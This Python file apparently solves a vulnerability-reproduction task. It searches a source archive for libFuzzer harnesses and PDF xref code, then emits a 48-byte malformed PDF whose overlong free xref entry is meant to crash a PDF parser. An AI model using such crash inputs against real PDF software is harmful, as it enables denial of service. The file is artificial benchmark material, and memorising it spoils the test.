import os
import io
import re
import tarfile
import zipfile
from typing import Iterable, Tuple, Optional


class Solution:
    def _iter_text_files_from_dir(self, root: str) -> Iterable[Tuple[str, str]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".cmake", ".txt", ".mk", ".py", ".sh"}
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                p = os.path.join(dirpath, fn)
                try:
                    st = os.stat(p)
                    if st.st_size > 2_000_000:
                        continue
                    with open(p, "rb") as f:
                        data = f.read()
                    yield p, data.decode("utf-8", "ignore")
                except Exception:
                    continue

    def _iter_text_files_from_tar(self, tar_path: str) -> Iterable[Tuple[str, str]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".cmake", ".txt", ".mk", ".py", ".sh"}
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    name = m.name
                    _, ext = os.path.splitext(name)
                    if ext.lower() not in exts:
                        continue
                    if m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield name, data.decode("utf-8", "ignore")
                    except Exception:
                        continue
        except Exception:
            return

    def _iter_text_files_from_zip(self, zip_path: str) -> Iterable[Tuple[str, str]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".cmake", ".txt", ".mk", ".py", ".sh"}
        try:
            with zipfile.ZipFile(zip_path, "r") as zf:
                for zi in zf.infolist():
                    if zi.is_dir():
                        continue
                    name = zi.filename
                    _, ext = os.path.splitext(name)
                    if ext.lower() not in exts:
                        continue
                    if zi.file_size > 2_000_000:
                        continue
                    try:
                        data = zf.read(name)
                        yield name, data.decode("utf-8", "ignore")
                    except Exception:
                        continue
        except Exception:
            return

    def _scan_for_fuzzer_style(self, src_path: str) -> Tuple[bool, bool]:
        direct_xref = False
        pdf_like = False

        it = None
        if os.path.isdir(src_path):
            it = self._iter_text_files_from_dir(src_path)
        else:
            it = self._iter_text_files_from_tar(src_path)
            any_yielded = False
            for _ in it:
                any_yielded = True
                break
            if any_yielded:
                it = self._iter_text_files_from_tar(src_path)
            else:
                it = self._iter_text_files_from_zip(src_path)

        for name, txt in it:
            if "LLVMFuzzerTestOneInput" in txt:
                if "read_xrefEntry" in txt or "xrefEntry" in txt:
                    direct_xref = True
                if "processMemoryFile" in txt or "%PDF" in txt or "QPDF" in txt:
                    pdf_like = True
            else:
                if "read_xrefEntry" in txt and "LLVMFuzzerTestOneInput" in txt:
                    direct_xref = True
                if "%PDF" in txt and ("fuzzer" in name.lower() or "fuzz" in name.lower()):
                    pdf_like = True

            if direct_xref and pdf_like:
                break

        return direct_xref, pdf_like

    def solve(self, src_path: str) -> bytes:
        # Malformed, overlong free xref entry: "f1" followed by zeros.
        entry_pdf = b"0000000000 00000 f1" + (b"0" * 10) + b"\n"  # 30 bytes
        minimal_pdf_48 = b"%PDF-1.0\nxref\n0 1\n" + entry_pdf  # 18 + 30 = 48

        raw_entry_48 = b"0000000000 00000 f1" + (b"0" * 28) + b"\n"  # 19 + 28 + 1 = 48

        direct_xref, pdf_like = self._scan_for_fuzzer_style(src_path)

        if direct_xref and not pdf_like:
            return raw_entry_48

        return minimal_pdf_48